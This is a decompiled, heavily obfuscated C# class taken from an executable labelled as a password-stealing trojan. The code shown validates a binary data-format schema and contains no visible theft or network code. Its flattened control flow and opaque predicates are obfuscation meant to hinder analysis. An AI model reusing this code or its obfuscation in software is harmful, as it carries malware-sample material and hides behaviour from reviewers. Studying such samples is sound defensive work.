// Decompiled with JetBrains decompiler
// Type: rw.zwd
// Assembly: DynamicMet, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: AF763EB9-8CE5-4C8D-A157-180B851AA721
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-Trojan-PSW.MSIL.Stealer.gen-f9cf1ff0097d861156fd09818614a3bb202741325fc00049356ff51a8388dfd6.exe

using System;
using System.Collections;
using System.Collections.Generic;
using System.Runtime.InteropServices;

namespace rw
{
  internal class zwd : nwe
  {
    internal static zwd r82;

    public void Cfp(Od _param1)
    {
      bool flag1 = false;
      IEnumerator<OA> enumerator1 = _param1.wVE().GetEnumerator();
      try
      {
        while (enumerator1.MoveNext())
        {
          OA current1 = enumerator1.Current;
          bool flag2 = false;
          bool flag3 = zwd.j8U((object) current1) && !flag1;
          int num1 = 2;
          HashSet<long> longSet1;
          HashSet<string> stringSet;
          while (true)
          {
            mR mR;
            HashSet<long> longSet2;
            V5 v5;
            IEnumerator<z9> enumerator2;
            bool flag4;
            HashSet<Pwk> pwkSet;
            IEnumerator<g4> enumerator3;
            bool flag5;
            int num2;
            switch (num1)
            {
              case 1:
                longSet2 = new HashSet<long>();
                pwkSet = new HashSet<Pwk>();
                enumerator2 = v5.ctI().GetEnumerator();
                num1 = 9;
                continue;
              case 2:
                if (!flag3)
                {
                  if (current1.ER2() && flag1)
                    zwd.R8A(current1.mRN(), (object) "Only one 'format' specifier is allowed per schema");
                }
                else
                  goto label_142;
label_133:
                flag5 = _param1.wVu().ContainsKey(current1.oRh());
                num1 = zwd.i8l() ? 4 : 3;
                continue;
label_142:
                flag1 = true;
                _param1.SVO(current1);
                goto label_133;
              case 3:
                num2 = mR.Gfx() != "Deflate" ? 1 : 0;
                goto label_160;
              case 4:
                if (!flag5)
                  goto label_65;
                else
                  goto label_50;
label_12:
                using (IEnumerator<Rr> enumerator4 = current1.rf6().GetEnumerator())
                {
                  while (true)
                  {
                    if (zwd.U8t((object) enumerator4))
                      goto label_152;
                    else
                      goto label_155;
label_145:
                    int num3;
                    int num4 = num3;
label_146:
                    Rr current2;
                    switch (num4)
                    {
                      case 1:
                        goto label_134;
                      default:
                        if (current2.oRh() == "value")
                        {
                          qwp.Cq3(zwd.M8X((object) current2), "'value' is a reserved name for use in expressions in consumable types.");
                          continue;
                        }
                        if (!current1.iRz().ContainsKey((string) zwd.S80((object) current2)))
                        {
                          current1.iRz().Add((string) zwd.S80((object) current2), current2);
                          continue;
                        }
                        zwd.R8A(current2.mRN(), zwd.x8P((object) "Duplicate local variable name not allowed: '", (object) current2.oRh(), (object) "'"));
                        continue;
                    }
label_152:
                    current2 = enumerator4.Current;
                    num4 = 0;
                    if (zwd.u8p() == null)
                      goto label_146;
                    else
                      goto label_145;
label_155:
                    if (zwd.u8p() == null)
                    {
                      num4 = 1;
                      goto label_146;
                    }
                    else
                      goto label_145;
                  }
                }
label_50:
                qwp.Cq3(current1.mRN(), "Duplicate datablock name not allowed: '" + current1.oRh() + "'");
                goto label_12;
label_65:
                _param1.wVu().Add((string) zwd.o8B((object) current1), current1);
                goto label_12;
              case 5:
                goto label_135;
              case 6:
                try
                {
                  while (true)
                  {
                    if (enumerator3.MoveNext())
                      goto label_58;
                    else
                      goto label_55;
label_53:
                    continue;
label_55:
                    int num5 = 0;
                    if (!zwd.i8l())
                      goto label_56;
label_52:
                    switch (num5)
                    {
                      case 1:
                        goto label_59;
                      default:
                        goto label_143;
                    }
label_56:
                    num5 = 0;
                    goto label_52;
label_58:
                    g4 current3 = enumerator3.Current;
                    if (zwd.k8O(zwd.B8c((object) current3), (object) "value"))
                    {
                      qwp.Cq3(zwd.t8d((object) current3), "'value' is a reserved name for use in expressions in consumable types.");
                      goto label_53;
                    }
label_59:
                    if (!mR.mfQ().ContainsKey(current3.oRh()))
                    {
                      mR.mfQ().Add(current3.oRh(), current3);
                      goto label_53;
                    }
                    else
                    {
                      qwp.Cq3(current3.mRN(), "Duplicate field name not allowed: '" + (string) zwd.B8c((object) current3) + "'");
                      goto label_53;
                    }
                  }
                }
                finally
                {
                  enumerator3?.Dispose();
                }
              case 7:
label_143:
                using (IEnumerator<g4> enumerator5 = mR.Rf1().GetEnumerator())
                {
                  while (zwd.U8t((object) enumerator5))
                  {
                    g4 current4 = enumerator5.Current;
                    if (mR.iRz().ContainsKey((string) zwd.B8c((object) current4)))
                      qwp.Cq3(current4.mRN(), "Name clash with local variable: '" + current4.oRh() + "'");
                  }
                  int num6 = 0;
                  if (!zwd.i8l())
                    goto label_17;
label_14:
                  switch (num6)
                  {
                    default:
                      goto label_138;
                  }
label_17:
                  int num7;
                  num6 = num7;
                  goto label_14;
                }
label_138:
                if (mR.Gfx() != null)
                {
                  if (mR.Gfx() != "GZip")
                  {
                    num1 = 3;
                    continue;
                  }
                  num2 = 0;
                  goto label_160;
                }
                else
                  goto label_129;
              case 8:
                if (current1 is nG)
                {
                  int num8;
                  num1 = zwd.u8p() == null ? 0 : num8;
                  continue;
                }
                goto label_136;
              case 9:
                try
                {
                  while (true)
                  {
                    if (enumerator2.MoveNext())
                      goto label_104;
                    else
                      goto label_119;
label_68:
                    int num9;
                    int num10 = num9;
label_69:
                    Pwk pwk1;
                    z9 current5;
                    bool flag6;
                    while (true)
                    {
                      long num11;
                      bool flag7;
                      bool flag8;
                      NwE nwE;
                      switch (num10)
                      {
                        case 1:
                          if (flag7)
                          {
                            qwp.Cq3(pwk1.mRN(), "Range is empty because of the inclusions brackets: '" + pwk1?.ToString() + "'");
                            num10 = zwd.i8l() ? 3 : 2;
                            continue;
                          }
                          goto case 3;
                        case 2:
                          nwE = current5.XJZ() as NwE;
                          foreach (int num12 in longSet2)
                          {
                            if (zwd.N81((object) nwE) == (long) num12)
                            {
                              zwd.R8A(current5.mRN(), (object) ("Value already defined: '" + num12.ToString() + "'"));
                              int num13 = 0;
                              if (!zwd.i8l())
                                goto label_95;
label_92:
                              switch (num13)
                              {
                                default:
                                  continue;
                              }
label_95:
                              num13 = 0;
                              goto label_92;
                            }
                          }
                          using (HashSet<Pwk>.Enumerator enumerator6 = pwkSet.GetEnumerator())
                          {
                            while (enumerator6.MoveNext())
                            {
                              Pwk current6 = enumerator6.Current;
                              zwd.xqx(zwd.N81((object) nwE), current6, current5);
                            }
                            goto case 4;
                          }
                        case 3:
                          if (num11 == 1L)
                          {
                            if (zwd.i8l())
                            {
                              num10 = 0;
                              continue;
                            }
                            goto label_68;
                          }
                          else
                            goto label_100;
                        case 4:
                          longSet2.Add(zwd.N81((object) nwE));
                          break;
                        case 5:
                          num11 = pwk1.zOs() - pwk1.gOv() + 1L;
                          if (pwk1.TOY() == (H6) 1)
                            goto label_103;
label_99:
                          if (zwd.M8W((object) pwk1) == (H6) 1)
                            goto label_82;
label_74:
                          flag7 = num11 == 0L;
                          if (zwd.i8l())
                          {
                            num10 = 1;
                            continue;
                          }
                          goto label_68;
label_82:
                          --num11;
                          goto label_74;
label_103:
                          --num11;
                          goto label_99;
                        case 6:
                          goto label_104;
                        case 7:
                          goto label_79;
                        case 8:
                          pwk1 = current5.XJZ() as Pwk;
                          if (pwk1.zOs() <= pwk1.gOv())
                          {
                            qwp.Cq3(zwd.z8u((object) pwk1), "End-value must be larger than start-value in the range");
                            goto case 5;
                          }
                          else
                          {
                            num10 = 5;
                            continue;
                          }
                        case 9:
                          if (flag8)
                          {
                            num10 = 8;
                            continue;
                          }
                          goto label_117;
                        case 10:
                          if (flag6)
                            goto case 2;
                          else
                            break;
                        case 11:
                          goto label_10;
                        default:
                          goto label_125;
                      }
                      flag8 = current5.XJZ() is Pwk;
                      num10 = 9;
                    }
label_79:
                    ba ba = new ba();
                    ba.vJW(current5.KJU());
                    v5.DtH().Add(current5.KJU(), ba);
                    goto label_75;
label_100:
                    foreach (int num14 in longSet2)
                      zwd.xqx((long) num14, pwk1, current5);
                    foreach (Pwk pwk2 in pwkSet)
                      zwd.iqW(pwk1, pwk2, current5);
                    pwkSet.Add(pwk1);
label_117:
                    continue;
label_125:
                    qwp.FqA(pwk1.mRN(), "Range is of length 1, why not use a single value instead?: '" + pwk1?.ToString() + "'");
                    goto label_100;
label_75:
                    flag6 = zwd.O8G((object) current5) is NwE;
                    num10 = 7;
                    if (zwd.u8p() == null)
                    {
                      num10 = 10;
                      goto label_69;
                    }
                    else
                      goto label_69;
label_104:
                    current5 = enumerator2.Current;
                    bool flag9 = zwd.O8G((object) current5) is MwL;
                    if (flag9 && !flag2)
                      flag2 = true;
                    else
                      goto label_116;
label_108:
                    if (current5.KJU() != null && !v5.DtH().ContainsKey(current5.KJU()))
                    {
                      num9 = 7;
                      goto label_68;
                    }
                    else
                      goto label_75;
label_116:
                    if (flag9 && flag2)
                    {
                      qwp.Cq3(current5.mRN(), "Only one 'else' event allowed");
                      goto label_108;
                    }
                    else
                      goto label_108;
label_119:
                    num10 = 11;
                    goto label_69;
                  }
                }
                finally
                {
                  enumerator2?.Dispose();
                }
              case 10:
label_134:
                flag4 = current1 is mR;
                num1 = 11;
                continue;
              case 11:
                if (flag4)
                {
                  mR = current1 as mR;
                  enumerator3 = mR.Rf1().GetEnumerator();
                  num1 = 6;
                  continue;
                }
                goto label_130;
              default:
                goto label_9;
            }
label_10:
            longSet1 = new HashSet<long>();
            stringSet = new HashSet<string>();
            num1 = 8;
            continue;
label_129:
label_130:
            if (current1 is V5)
            {
              v5 = current1 as V5;
              zwd.R8J((object) v5, zwd.rqT(v5.Hfy()));
              num1 = zwd.u8p() != null ? 0 : 1;
              continue;
            }
            goto label_10;
label_160:
            if (num2 != 0)
            {
              qwp.Cq3(mR.Cfi(), "Unknown compression method: '" + mR.Gfx() + "'. Expected 'GZip' or 'Deflate'.");
              goto label_129;
            }
            else
              goto label_129;
          }
label_9:
          nG nG = current1 as nG;
          nG.Rfo(zwd.rqT(nG.Hfy()));
          foreach (Y2 y2 in (IEnumerable<Y2>) nG.ctU())
          {
            if (!longSet1.Contains(y2.lJN()))
              goto label_40;
            else
              goto label_39;
label_30:
            if (zwd.lfK((object) y2) == null || !stringSet.Contains(y2.xJe()))
              goto label_33;
            else
              goto label_34;
label_28:
            int num15;
            int num16 = num15;
label_29:
            long num17;
            while (true)
            {
              switch (num16)
              {
                case 1:
                  goto label_41;
                case 2:
                  if (y2.lJN() > num17)
                  {
                    zwd.R8A(y2.mRN(), (object) ("Bit-index exceeds the boundary of the primitive type: '" + zwd.i8z((object) y2).ToString() + "' > " + num17.ToString()));
                    if (zwd.i8l())
                    {
                      num16 = 0;
                      continue;
                    }
                    goto label_28;
                  }
                  else
                    goto label_36;
                case 3:
                  goto label_33;
                default:
                  goto label_35;
              }
            }
label_35:
label_36:
            continue;
label_33:
            if (zwd.lfK((object) y2) != null)
            {
              stringSet.Add(y2.xJe());
              if (zwd.i8l())
              {
                num16 = 1;
                goto label_29;
              }
              else
                goto label_28;
            }
            else
              goto label_41;
label_34:
            zwd.R8A(y2.mRN(), (object) ("Two identical bitnames found: '" + (string) zwd.lfK((object) y2) + "'"));
label_41:
            num17 = (long) (zwd.rqT(nG.Hfy()) * 8 - 1);
            num16 = 2;
            goto label_29;
label_39:
            qwp.Cq3(zwd.k8x((object) y2), "Bit may only be listed once: '" + zwd.i8z((object) y2).ToString() + "'");
            goto label_30;
label_40:
            longSet1.Add(y2.lJN());
            goto label_30;
          }
label_135:
label_136:;
        }
      }
      finally
      {
        if (enumerator1 != null)
          zwd.HfN((object) enumerator1);
      }
      bool flag10 = _param1.PVd() == null;
      int num18 = 0;
      if (!zwd.i8l())
        goto label_4;
label_1:
      switch (num18)
      {
        default:
          if (!flag10)
            return;
          qwp.xq5("No 'format' block specified. Schema needs an entry point.");
          return;
      }
label_4:
      int num19;
      num18 = num19;
      goto label_1;
    }

    private static void xqx(long _param0, Pwk _param1, z9 _param2)
    {
      bool flag = _param0 < _param1.gOv() || _param0 > _param1.zOs();
      int num1 = 3;
      while (true)
      {
        switch (num1)
        {
          case 1:
            zwd.R8A(zwd.LfZ((object) _param2), (object) ("Value intersecting range is not allowed: '" + _param1?.ToString() + "'"));
            num1 = 2;
            continue;
          case 2:
            if (_param1.TOY() == (H6) 0)
            {
              if (_param0 != _param1.gOv())
              {
                int num2;
                num1 = zwd.i8l() ? 0 : num2;
                continue;
              }
              goto label_12;
            }
            else
              goto label_9;
          case 3:
            if (!flag)
            {
              if (_param0 > _param1.gOv() && _param0 < _param1.zOs())
              {
                num1 = zwd.u8p() != null ? 0 : 1;
                continue;
              }
              goto case 2;
            }
            else
              goto label_6;
          default:
            goto label_9;
        }
      }
label_6:
      return;
label_9:
      int num3 = _param1.cOw() != (H6) 0 ? 0 : (_param0 == zwd.kfv((object) _param1) ? 1 : 0);
      goto label_13;
label_12:
      num3 = 1;
label_13:
      if (num3 == 0)
        return;
      qwp.Cq3(_param2.mRN(), "Value intersecting range is not allowed. Check the inclusion brackets: '" + _param1?.ToString() + "'");
    }

    private static void iqW(Pwk _param0, Pwk _param1, z9 _param2)
    {
      int num1 = 1;
label_1:
      int num2 = num1;
      bool flag;
      while (true)
      {
        int num3;
        switch (num2)
        {
          case 1:
            if (_param0.gOv() <= _param1.zOs())
            {
              if (zwd.u8p() == null)
              {
                num2 = 0;
                continue;
              }
              goto label_1;
            }
            else
            {
              num3 = 1;
              break;
            }
          case 2:
            goto label_17;
          case 3:
            goto label_12;
          case 4:
            goto label_11;
          default:
            num3 = _param1.gOv() > _param0.zOs() ? 1 : 0;
            break;
        }
        if (num3 != 0)
        {
          if (zwd.i8l())
            num2 = 2;
          else
            goto label_1;
        }
        else if (zwd.kfv((object) _param0) == _param1.gOv() && (_param0.cOw() == (H6) 1 || _param1.TOY() == (H6) 1))
        {
          num2 = 3;
        }
        else
        {
          flag = _param1.zOs() == _param0.gOv() && (_param1.cOw() == (H6) 1 || zwd.kfI((object) _param0) == (H6) 1);
          if (zwd.i8l())
            num2 = 4;
          else
            goto label_1;
        }
      }
label_17:
      return;
label_12:
      return;
label_11:
      if (flag)
        return;
      qwp.Cq3(_param2.mRN(), "Intersecting ranges not allowed: '" + _param0?.ToString() + "' and '" + _param1?.ToString() + "'");
    }

    public static int rqT(cD _param0)
    {
      int num1 = 5;
label_1:
      int num2 = num1;
      nH nH;
      int num3;
      while (true)
      {
        switch (num2)
        {
          case 1:
            goto label_13;
          case 2:
            goto label_8;
          case 3:
            goto label_19;
          case 4:
            switch (nH)
            {
              case nH.CallExpression:
                goto label_14;
              case nH.Bool:
                goto label_4;
              case nH.Ubyte:
                goto label_10;
              case nH.Sbyte:
                goto label_13;
              case nH.Ushort:
                goto label_18;
              case nH.Short:
                num3 = 2;
                if (zwd.u8p() == null)
                {
                  num2 = 0;
                  continue;
                }
                goto label_1;
              case nH.Uint:
                goto label_17;
              case nH.Int:
                goto label_16;
              case nH.Ulong:
                goto label_9;
              case nH.Long:
                goto label_19;
              default:
                goto label_7;
            }
          case 5:
            nH = _param0.Ct4();
            if (zwd.u8p() == null)
            {
              num2 = 4;
              continue;
            }
            goto label_1;
          case 6:
label_14:
            qwp.qqc("Function type...");
            if (zwd.u8p() == null)
            {
              num2 = 2;
              continue;
            }
            goto label_1;
          default:
            goto label_11;
        }
      }
label_4:
      num3 = 1;
      goto label_11;
label_7:
      num3 = 1;
      goto label_11;
label_8:
      num3 = 1;
      goto label_11;
label_9:
      num3 = 4;
      goto label_11;
label_10:
      num3 = 1;
label_11:
      return num3;
label_13:
      num3 = 1;
      goto label_11;
label_16:
      num3 = 4;
      goto label_11;
label_17:
      num3 = 4;
      goto label_11;
label_18:
      num3 = 2;
      goto label_11;
label_19:
      num3 = 4;
      goto label_11;
    }

    public zwd()
    {
      ccw.xFvA3V();
      // ISSUE: explicit constructor call
      base.\u002Ector();
    }

    internal static bool j8U([In] object obj0) => ((OA) obj0).ER2();

    internal static void R8A(Nx _param0, [In] object obj1) => qwp.Cq3(_param0, (string) obj1);

    internal static object o8B([In] object obj0) => (object) ((OA) obj0).oRh();

    internal static Nx M8X([In] object obj0) => ((Rr) obj0).mRN();

    internal static object S80([In] object obj0) => (object) ((Rr) obj0).oRh();

    internal static object x8P([In] object obj0, [In] object obj1, [In] object obj2) => (object) ((string) obj0 + (string) obj1 + (string) obj2);

    internal static bool U8t([In] object obj0) => ((IEnumerator) obj0).MoveNext();

    internal static object B8c([In] object obj0) => (object) ((g4) obj0).oRh();

    internal static bool k8O([In] object obj0, [In] object obj1) => (string) obj0 == (string) obj1;

    internal static Nx t8d([In] object obj0) => ((g4) obj0).mRN();

    internal static void R8J([In] object obj0, int _param1) => ((V5) obj0).Rfo(_param1);

    internal static object O8G([In] object obj0) => (object) ((z9) obj0).XJZ();

    internal static long N81([In] object obj0) => ((NwE) obj0).FOR();

    internal static Nx z8u([In] object obj0) => ((Pwk) obj0).mRN();

    internal static H6 M8W([In] object obj0) => ((Pwk) obj0).cOw();

    internal static Nx k8x([In] object obj0) => ((Y2) obj0).mRN();

    internal static long i8z([In] object obj0) => ((Y2) obj0).lJN();

    internal static object lfK([In] object obj0) => (object) ((Y2) obj0).xJe();

    internal static void HfN([In] object obj0) => ((IDisposable) obj0).Dispose();

    internal static bool i8l() => zwd.r82 == null;

    internal static zwd u8p() => zwd.r82;

    internal static Nx LfZ([In] object obj0) => ((z9) obj0).mRN();

    internal static long kfv([In] object obj0) => ((Pwk) obj0).zOs();

    internal static H6 kfI([In] object obj0) => ((Pwk) obj0).TOY();
  }
}
